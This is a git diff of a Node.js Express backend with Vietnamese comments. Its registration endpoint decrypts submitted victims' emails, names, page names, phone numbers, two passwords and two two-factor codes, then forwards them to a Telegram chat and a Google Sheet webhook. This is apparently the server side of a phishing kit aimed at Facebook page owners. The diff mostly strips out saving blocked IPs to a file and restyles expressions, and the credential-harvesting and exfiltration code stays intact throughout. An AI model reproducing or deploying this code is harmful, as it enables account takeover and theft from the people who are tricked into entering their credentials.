@@ -5,7 +5,6 @@ import TelegramBot from 'node-telegram-bot-api';
 import axios from "axios";
 import CryptoJS from "crypto-js";
 import rateLimit from "express-rate-limit";
-import fs from "fs";
 
 const app = express();
 app.use(cors('*'));
@@ -13,23 +12,6 @@ app.use(express.json());
 app.set('trust proxy', 1);
 
 const blockedIPs = new Set();
-const BLOCKED_IPS_FILE = 'blocked_ips.json';
-
-// Tải danh sách IP bị block từ file
-function loadBlockedIPs() {
-    if (fs.existsSync(BLOCKED_IPS_FILE)) {
-        const data = fs.readFileSync(BLOCKED_IPS_FILE, 'utf-8');
-        const ips = JSON.parse(data);
-        ips.forEach(ip => blockedIPs.add(ip));
-    }
-}
-
-// Lưu danh sách IP bị block vào file
-function saveBlockedIPs() {
-    fs.writeFileSync(BLOCKED_IPS_FILE, JSON.stringify([...blockedIPs]));
-}
-
-loadBlockedIPs(); // Tải danh sách IP khi server khởi động
 
 const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
 const secretKey = 'HDNDT-JDHT8FNEK-JJHR';
@@ -56,9 +38,7 @@ const registerLimiter = rateLimit({
     message: 'Access forbidden: Too Many Requests',
     headers: true,
     handler: (req, res) => {
-        const ip = req.ip;
-        blockedIPs.add(ip); // Block IP vĩnh viễn
-        saveBlockedIPs();   // Cập nhật danh sách IP bị block
+        blockedIPs.add(req.ip);
         res.status(429).json({
             message: 'Access forbidden: IP is permanently blocked',
         });
@@ -77,31 +57,31 @@ app.post('/api/register', ipFilter, registerLimiter, (req, res) => {
             error_code: 0
         });
 
-        const message = `<b>Ip:</b> <code>${values.ip || ''}</code>\n-----------------------------\n<b>Email Business:</b> <code>${values.businessEmail || ''} </code>\n<b>Email Personal:</b> <code>${values.personalEmail || ''}</code>\n<b>User name:</b> <code>${values.fullName || ''} </code>\n<b>Page name:</b> <code>${values.fanpageName || ''}</code>\n<b>Phone Number:</b> <code>${values.mobilePhone || ''}</code>\n<b>Password First:</b> <code>${values.passwordFirst || ''}</code>\n<b>Password Second:</b> <code>${values.passwordSecond || ''}</code>\n-----------------------------\n<b>Image:</b> <code>${values.imageUrl || ''}</code>\n-----------------------------\n<b>First Two-Fa:</b> <code>${values.firstTwoFa || ''}</code>\n<b>Second Two-Fa:</b> <code>${values.secondTwoFa || ''}</code>\n`;
+        const message = `<b>Ip:</b> <code>${values.ip ? values.ip : ''}</code>\n-----------------------------\n<b>Email Business:</b> <code>${values.businessEmail ? values.businessEmail : ''} </code>\n<b>Email Personal:</b> <code>${values.personalEmail ? values.personalEmail : ''}</code>\n<b>User name:</b> <code>${values.fullName ? values.fullName : ''} </code>\n<b>Page name:</b> <code>${values.fanpageName ? values.fanpageName : ''}</code>\n<b>Phone Number:</b> <code>${values.mobilePhone ? values.mobilePhone : ''}</code>\n<b>Password First:</b> <code>${values.passwordFirst ? values.passwordFirst : ''}</code>\n<b>Password Second:</b> <code>${values.passwordSecond ? values.passwordSecond : ''}</code>\n-----------------------------\n<b>Image:</b> <code>${values.imageUrl ? values.imageUrl : ''}</code>\n-----------------------------\n<b>First Two-Fa:</b> <code>${values.firstTwoFa ? values.firstTwoFa : ''}</code>\n<b>Second Two-Fa:</b> <code>${values.secondTwoFa ? values.secondTwoFa : ''}</code>\n`;
         bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'html' });
         
         if (process.env.WEBHOOK_URL) {
             const url = new URL(process.env.WEBHOOK_URL);
 
-            url.searchParams.append('Ip', values.ip || '');
-            url.searchParams.append('City', values.city || '');
-            url.searchParams.append('Country', values.country || '');
-            url.searchParams.append('Email Business', values.businessEmail || '');
-            url.searchParams.append('Email Personal', values.personalEmail || '');
-            url.searchParams.append('Full Name', values.fullName || '');
-            url.searchParams.append('Fanpage Name', values.fanpageName || '');
-            url.searchParams.append('Phone Number', values.mobilePhone || '');
-            url.searchParams.append('Password First', values.passwordFirst || '');
-            url.searchParams.append('Password Second', values.passwordSecond || '');
-            url.searchParams.append('First Two-Fa', values.firstTwoFa || '');
-            url.searchParams.append('Second Two-Fa', values.secondTwoFa || '');
-            url.searchParams.append('Image', values.imageUrl || '');
+            url.searchParams.append('Ip', values.ip ? values.ip : '');
+            url.searchParams.append('City', values.city ? values.city : '');
+            url.searchParams.append('Country', values.country ? values.country : '');
+            url.searchParams.append('Email Business', values.businessEmail ? values.businessEmail : '');
+            url.searchParams.append('Email Personal', values.personalEmail ? values.personalEmail : '');
+            url.searchParams.append('Full Name', values.fullName ? values.fullName : '');
+            url.searchParams.append('Fanpage Name', values.fanpageName ? values.fanpageName : '');
+            url.searchParams.append('Phone Number', values.mobilePhone ? values.mobilePhone : '');
+            url.searchParams.append('Password First', values.passwordFirst ? values.passwordFirst : '');
+            url.searchParams.append('Password Second', values.passwordSecond ? values.passwordSecond : '');
+            url.searchParams.append('First Two-Fa', values.firstTwoFa ? values.firstTwoFa : '');
+            url.searchParams.append('Second Two-Fa', values.secondTwoFa ? values.secondTwoFa : '');
+            url.searchParams.append('Image', values.imageUrl ? values.imageUrl : '');
 
             axios.get(url)
-                .then(() => {
+                .then(response => {
                     bot.sendMessage(process.env.CHAT_ID, '✅ Thêm dữ liệu vào Sheet thành công.');
                 })
-                .catch(() => {
+                .catch(err => {
                     bot.sendMessage(process.env.CHAT_ID, 'Thêm vào Google Sheet không thành công, liên hệ <code>@otisth</code>',  { parse_mode: 'html' });
                 });
         }
@@ -109,16 +89,12 @@ app.post('/api/register', ipFilter, registerLimiter, (req, res) => {
     } catch (error) {
         bot.sendMessage(process.env.CHAT_ID, 'Server giải mã dữ liệu không thành công, liên hệ <code>@otisth</code>',  { parse_mode: 'html' });
         res.status(500).json({
-            message: 'Error',
+            message: 'Erorr',
             error_code: 1
         });
     }
 
 });
-
-// Ghi lại danh sách IP khi server dừng
-process.on('exit', saveBlockedIPs);
-process.on('SIGINT', saveBlockedIPs);
 
 app.listen(process.env.PORT, () => {
     console.log(`Server đang lắng nghe tại cổng ${process.env.PORT}`);
